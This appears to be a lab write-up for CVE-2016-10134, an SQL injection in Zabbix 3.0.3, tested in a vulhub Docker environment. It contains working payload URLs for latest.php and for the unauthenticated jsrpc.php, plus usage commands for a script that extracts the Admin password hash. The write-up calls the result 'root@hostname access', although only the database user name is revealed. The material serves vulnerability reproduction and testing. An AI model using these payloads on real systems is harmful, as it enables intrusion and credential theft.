# Vuln2Action-Demo
This repository contains the demo video for the exploit code to be tested in sandboxed environment.
The testing has been done using the vulhub platform .
# CVE-2016-10134 Zabbix SQL Injection Report

## 1. Introduction to CVE-2016-10134

This report details the SQL injection vulnerability identified as CVE-2016-10134 affecting Zabbix versions prior to 2.2.14 and 3.0 before 3.0.4. The vulnerability is present in the `latest.php` file and can be exploited via the `toggle_ids` array parameter, allowing remote attackers to execute arbitrary SQL commands. A critical aspect of this vulnerability is its ability to be triggered through `jsrpc.php` without requiring prior authentication.

References:

- https://support.zabbix.com/browse/ZBX-11023
- https://www.exploit-db.com/exploits/40237
- https://www.exploit-db.com/exploits/40353

## 2. Environment Setup

To reproduce and test the vulnerability, a vulnerable Zabbix environment can be set up using Docker Compose.

1.  Navigate to the `vulhub/zabbix/CVE-2016-10134` directory.
2.  Execute the following command to start the Zabbix 3.0.3 environment:
    ```bash
    docker compose up -d
    ```
    This command will spin up the necessary containers including MySQL (database), Zabbix server, Zabbix agent, and the Zabbix web interface. If any containers fail to start due to limited memory, check their status with `docker compose ps` and restart them using `docker compose start`.

## 3. Manual Exploitation

The vulnerability can be manually tested via the Zabbix web interface.

### Method 1: Authenticated SQL Injection via `latest.php`

1.  **Access Zabbix**: Open a web browser and navigate to `http://your-ip:8080`.
2.  **Login**: Log in with the guest account (username: `guest`, password: empty).
3.  **Obtain `zbx_sessionid`**: After logging in, inspect your browser's cookies and locate `zbx_sessionid`. Copy the last 16 characters of this cookie value.
    ![zbx_sessionid](cid:image_1)
4.  **Trigger SQL Injection**: Use the copied 16 characters as the `sid` value in the URL. For example, if your `zbx_sessionid` ends with `055e1ffa36164a58`, visit:
    ```
    http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
    ```
    Upon visiting this URL, you should observe an SQL error message, which indicates a successful SQL injection, revealing the database user (e.g., `root@172.19.0.3`).
    ![latest.php exploit](cid:image_3)

### Method 2: Unauthenticated SQL Injection via `jsrpc.php`

This method does not require authentication.

1.  **Trigger SQL Injection**: Visit the following URL directly:
    ```
    http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
    ```
    This will also trigger an SQL error revealing the database user, confirming the unauthenticated SQL injection.
    ![jsrpc.php exploit](cid:image_2)

The successful injection revealing `root@hostname` (e.g., `root@172.19.0.3`) confirms the vulnerability. From this point, further SQL queries can be crafted to extract more information.

## 4. Automated Exploitation with `CVE-2016-10134_generated.py`

The provided Python script `CVE-2016-10134_generated.py` automates the detection and exploitation of this vulnerability, offering both time-based and error-based blind SQL injection techniques.

### Overview of the Script's Capabilities

The script includes:

- **Authentication**: Automatically logs in to Zabbix using provided credentials (default: `Admin`/`zabbix`) to establish a valid session.
- **Detection**: Implements time-based and error-based SQLi detection methods for both `latest.php` (authenticated) and `jsrpc.php` (unauthenticated).
- **Blind Extraction Engine**: A robust engine for character-by-character blind extraction of data from the database using either time-based delays or response length differences.
- **High-level Extraction Targets**: Functions to extract specific sensitive information, such as:
  - Database version (`SELECT @@version`)
  - Current database user (`SELECT user()`)
  - Current database name (`SELECT database()`)
  - Zabbix Admin password hash (`SELECT passwd FROM users WHERE alias='Admin'`)
  - User count and individual user aliases from the `users` table.
- **Zabbix Version Fingerprinting**: Attempts to determine the Zabbix version from the login page to check if it falls within the known vulnerable range.

### How to Use the Script

To use the script, you need Python 3 and the `requests` library. You can install `requests` using `pip install requests`.

```bash
# General usage
python3 CVE-2016-10134_generated.py --url http://your-ip:8080 [ACTION]

# Example: Detect vulnerability (time-based, most reliable)
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --detect

# Example: Extract database version
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --version

# Example: Blind-extract current database user character by character
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --extract-user

# Example: Blind-extract admin password hash (MD5)
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --dump-admin-hash

# Example: Run all detection and extraction steps
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --all

# Override default credentials
python3 CVE-2016-10134_generated.py --url http://localhost:8080 --username MyUser --password MyPassword --all
```

The script provides a comprehensive way to confirm the vulnerability and extract sensitive data from the Zabbix database, demonstrating how user aliases and password hashes can be retrieved after confirming SQL injection. The `dump-admin-hash` action specifically targets the `passwd` field for the `Admin` user in the `users` table.

This report summarizes the environment setup, manual exploitation steps leading to `root@hostname` access, and the automated methods provided by the Python script to further extract sensitive information like user aliases and password hashes.
